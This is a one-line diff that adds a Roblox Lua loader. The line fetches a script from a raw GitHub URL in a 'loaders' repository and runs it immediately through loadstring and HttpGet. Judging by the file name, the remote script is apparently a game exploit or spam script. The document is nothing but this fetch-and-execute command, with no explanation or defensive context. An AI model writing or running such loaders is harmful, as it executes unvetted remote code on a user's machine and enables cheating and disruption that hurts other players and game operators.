@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/it-hears-the-water-dont-splash-spam7-k1zkkcrimctcyt.lua"))()
